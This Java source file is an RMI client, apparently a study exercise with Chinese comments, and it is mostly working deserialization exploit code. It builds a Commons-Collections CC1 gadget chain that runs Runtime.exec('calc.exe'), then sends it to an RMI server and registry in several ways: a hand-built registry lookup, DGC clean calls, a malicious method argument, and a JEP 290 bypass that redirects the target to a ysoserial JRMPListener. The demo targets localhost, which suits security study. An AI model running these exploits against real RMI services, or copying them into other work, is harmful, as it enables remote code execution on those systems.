package com.endlessshw.rmi.client;

import com.endlessshw.rmi.common.IMyRemote;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import sun.rmi.registry.RegistryImpl_Stub;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.DGCImpl_Stub;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.StreamRemoteCall;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;


/**
 * @author hasee
 * @version 1.0
 * @description: RMI 客户端
 * @date 2023/5/3 11:59
 */
public class MyRemoteClient {
    public static void main(String[] args) throws Exception {
        // 通过注册中心连接到服务器
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        // 通过服务名查找服务，并转型成接口
        IMyRemote myRemote = (IMyRemote) registry.lookup("myRemote");
        // 调用方法
        myRemote.saySth("Hello");
        // myRemote.saySth(new HashMap<>());


        // 通过 Object 类型传入恶意类
        // attackByObject(myRemote);

        // 自定义 lookup 然后发起请求
        // myLookup(registry);

        // 自定义 bind 然后发起请求
        // myBind(registry);
        // JEP 290 后，服务端和注册中心必须在同一个 host 下，那么客户端就不能发起 bind 和 rebind 请求了
        // bind 和 rebind 也可以，不过由于其绑定时传入的是 Remote 的子类（自己定义的远程调用接口也是继承 Remote），因此还有一个思路就是传入恶意的 Remote 子类。
        // https://su18.org/post/rmi-attack/#2-%E6%94%BB%E5%87%BB-registry-%E7%AB%AF su18 师傅用的是 CC6 链

        // 自定义 DGC clean 请求
        // attackServerDGCClean(myRemote);

        // 自定义 DGC clean 请求并向服务中心发起攻击
        // attackRegistryDGCClean(registry);

        // 绕过 JEP 290
        attackBypassJEP290(registry);
    }

    private static void attackServerDGCClean(IMyRemote myRemote) throws Exception{
        // 1. 先拿到远程对象相关的 UnicastRef
        Field remoteObjectInvocationHandlerField = Class.forName("java.lang.reflect.Proxy").getDeclaredField("h");
        remoteObjectInvocationHandlerField.setAccessible(true);
        RemoteObjectInvocationHandler remoteObjectInvocationHandler = (RemoteObjectInvocationHandler) remoteObjectInvocationHandlerField.get(myRemote);
        UnicastRef unicastRef = (UnicastRef) remoteObjectInvocationHandler.getRef();

        // 2. 通过 UnicastRef，获取到 LiveRef
        LiveRef liveRef = unicastRef.getLiveRef();
        // 再通过反射拿到 TCPEndpoint
        Class<? extends LiveRef> tcpEndpointClass = liveRef.getClass();
        Field epField = tcpEndpointClass.getDeclaredField("ep");
        epField.setAccessible(true);
        TCPEndpoint tcpEndpoint = (TCPEndpoint) epField.get(liveRef);
        // 根据客户端在 DGCImpl_Stub 被创建的流程，拿到其内部类 EndpointEntry 类，调用它的 lookup 方法（返回值是 EndpointEntry）并创建 DGCImpl_Stub
        Class<?> DGCClient_EndpointEntryClass = Class.forName("sun.rmi.transport.DGCClient$EndpointEntry");
        Method lookupMethod = DGCClient_EndpointEntryClass.getDeclaredMethod("lookup", Endpoint.class);
        lookupMethod.setAccessible(true);
        // lookup 是静态方法，第一个参数传 null
        Object endpointEntry = lookupMethod.invoke(null, tcpEndpoint);
        Field dgcField = endpointEntry.getClass().getDeclaredField("dgc");
        dgcField.setAccessible(true);
        DGCImpl_Stub dgc = (DGCImpl_Stub) dgcField.get(endpointEntry);
        // 本质上就是拿到 DGC/DGCImpl_Stub 通信时用到的 UnicastRef，这里和上面的 unicastRef 对比，其 ObjID 发生了改变。
        UnicastRef unicastRef2 = (UnicastRef) dgc.getRef();
        final java.rmi.server.Operation[] operations = {
                new java.rmi.server.Operation("void clean(java.rmi.server.ObjID[], long, java.rmi.dgc.VMID, boolean)"),
                new java.rmi.server.Operation("java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[], long, java.rmi.dgc.Lease)")
        };
        final long interfaceHash = -669196253586618813L;
        StreamRemoteCall call = (StreamRemoteCall)unicastRef2.newCall(dgc,
                operations, 0, interfaceHash);
        try {
            java.io.ObjectOutput out = call.getOutputStream();
            out.writeObject(getSerializedCC1Object());
        } catch (java.io.IOException e) {
            throw new java.rmi.MarshalException("error marshalling arguments", e);
        }
        unicastRef2.invoke(call);
        unicastRef2.done(call);
    }

    /**
     * 绕过 JEP290，通过 ysoserial 的 JRMPListener 来攻击服务端
     */
    private static void attackBypassJEP290(Registry registry) throws Exception {
        // 7777 为 JRMPListener 的开放端口
        LiveRef liveRef = new LiveRef(new ObjID(new Random().nextInt()), new TCPEndpoint("127.0.0.1", 7777), false);
        // 创建 UnicastRef
        UnicastRef payloadObj = new UnicastRef(liveRef);
        try {
            // 拿到 RegistryImpl_Stub 的 UnicastRef
            UnicastRef unicastRef = (UnicastRef) ((RegistryImpl_Stub) registry).getRef();

            // 模拟 RMI RegistryImpl_Stub 的 lookup，手动对 Registry 发起请求
            Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"),
                    new Operation("java.lang.String list()[]"),
                    new Operation("java.rmi.Remote lookup(java.lang.String)"),
                    new Operation("void rebind(java.lang.String, java.rmi.Remote)"),
                    new Operation("void unbind(java.lang.String)")};
            StreamRemoteCall call = (StreamRemoteCall) unicastRef.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
            ObjectOutput out = call.getOutputStream();

            out.writeObject(payloadObj);
            unicastRef.invoke(call);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static void attackRegistryDGCClean(Registry registry) throws Exception {
        // 先拿到和注册中心通讯的 UnicastRef
        UnicastRef unicastRef = (UnicastRef) ((RegistryImpl_Stub) registry).getRef();

        // 通过 UnicastRef，获取到 LiveRef
        LiveRef liveRef = unicastRef.getLiveRef();

        // 再通过反射拿到 TCPEndpoint
        Class<? extends LiveRef> tcpEndpointClass = liveRef.getClass();
        Field epField = tcpEndpointClass.getDeclaredField("ep");
        epField.setAccessible(true);
        TCPEndpoint tcpEndpoint = (TCPEndpoint) epField.get(liveRef);

        // 根据客户端在 DGCImpl_Stub 被创建的流程，拿到其内部类 EndpointEntry 类，调用它的 lookup 方法（返回值是 EndpointEntry）并创建 DGCImpl_Stub
        Class<?> DGCClient_EndpointEntryClass = Class.forName("sun.rmi.transport.DGCClient$EndpointEntry");
        Method lookupMethod = DGCClient_EndpointEntryClass.getDeclaredMethod("lookup", Endpoint.class);
        lookupMethod.setAccessible(true);
        // lookup 是静态方法，第一个参数传 null
        Object endpointEntry = lookupMethod.invoke(null, tcpEndpoint);

        Field dgcField = endpointEntry.getClass().getDeclaredField("dgc");
        dgcField.setAccessible(true);
        DGCImpl_Stub dgc = (DGCImpl_Stub) dgcField.get(endpointEntry);

        // 本质上就是拿到 DGC/DGCImpl_Stub 通信时用到的 UnicastRef，这里和上面的 unicastRef 对比，其 ObjID 发生了改变。
        UnicastRef unicastRef2 = (UnicastRef) dgc.getRef();

        Operation[] operations = new Operation[]{new Operation("void clean(java.rmi.server.ObjID[], long, java.rmi.dgc.VMID, boolean)"), new Operation("java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[], long, java.rmi.dgc.Lease)")};
        // newCall 的第一个参数是 this，即 DGCImpl_Stub 这里就是 dgc
        RemoteCall call = unicastRef2.newCall(dgc, operations, 1, -669196253586618813L);
        try {
            java.io.ObjectOutput out = call.getOutputStream();
            out.writeObject(getSerializedCC1Object());
        } catch (java.io.IOException e) {
            throw new java.rmi.MarshalException("error marshalling arguments", e);
        }
        unicastRef2.invoke(call);
        unicastRef2.done(call);
    }



    /**
     * 模拟 RMI RegistryImpl_Stub 的 lookup，手动对 Registry 发起请求，源代码中是将传入的 name(String) 进行序列化发过去，因此在原来的 lookup 上没法下手脚。
     * 因此只能模仿其原生的逻辑，writeObject() 序列化一个对象（而不是 String）发送过去
     *
     * @param registry 注册中心
     */
    private static void myLookup(Registry registry) {
        try {
            // 拿到 RegistryImpl_Stub 的 UnicastRef
            UnicastRef unicastRef = (UnicastRef) ((RegistryImpl_Stub) registry).getRef();

            // 模拟 RMI RegistryImpl_Stub 的 lookup，手动对 Registry 发起请求
            Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"),
                    new Operation("java.lang.String list()[]"),
                    new Operation("java.rmi.Remote lookup(java.lang.String)"),
                    new Operation("void rebind(java.lang.String, java.rmi.Remote)"),
                    new Operation("void unbind(java.lang.String)")};
            StreamRemoteCall call = (StreamRemoteCall) unicastRef.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
            ObjectOutput out = call.getOutputStream();
            // 这里用了 CC1
            out.writeObject(getSerializedCC1Object());
            unicastRef.invoke(call);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

    }

    /**
     * 通过 Object 类型传入恶意类
     */
    public static void attackByObject(IMyRemote myRemote) {
        try {
            // 这里不用对恶意类序列化，因为 RegistryImpl_Stub 会对其进行序列化
            myRemote.saySth(getSerializedCC1Object());
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static Object getSerializedCC1Object() throws Exception {
        // 1. 构造链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        Transformer transformedChain = new ChainedTransformer(transformers);

        // 2. 构造 LazyMap（同时也相当于创建被代理类）
        HashMap<Object, Object> map = new HashMap<>();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map, transformedChain);

        // 3. 把 AnnotationInvocationHandler 的构造函数搞出来
        // 通过反射，获取到 class 类对象
        Class<?> aIHClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 通过 class 类对象获取 class 类对象的构造函数
        Constructor<?> aIHClassDeclaredConstructor = aIHClass.getDeclaredConstructor(Class.class, Map.class);
        // 取消其访问检查（即绕过 protected 和 private 关键字修饰，直接对其变量赋值），
        aIHClassDeclaredConstructor.setAccessible(true);

        // 4. 先搞出来一个调用处理器，这里第一个参数没有要求
        InvocationHandler invocationHandler = (InvocationHandler) aIHClassDeclaredConstructor.newInstance(Override.class, lazyMap);

        // 5. 创建代理对象（被代理类已经创建好了）
        System.out.println(Arrays.toString(lazyMap.getClass().getInterfaces()));
        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);

        // 6. 实例化并被序列化的对象（注意这里要传入代理对象，这样才能在其 readObject() 中调用代理对象的方法（即 entrySet()）
        return aIHClassDeclaredConstructor.newInstance(Override.class, proxyMap);
    }

    // 序列化，返回字节码字符串
    public static String serialize(Object payload) {
        // 创建恶意类
        // 创建文件对象
        ObjectOutputStream out = null;
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            out = new ObjectOutputStream(byteArrayOutputStream);
            out.writeObject(payload);
            return Arrays.toString(byteArrayOutputStream.toByteArray());
        } catch (IOException e) {
            throw new RuntimeException(e);
        } finally {
            try {
                if (out != null) {
                    out.flush();
                    out.close();
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
}
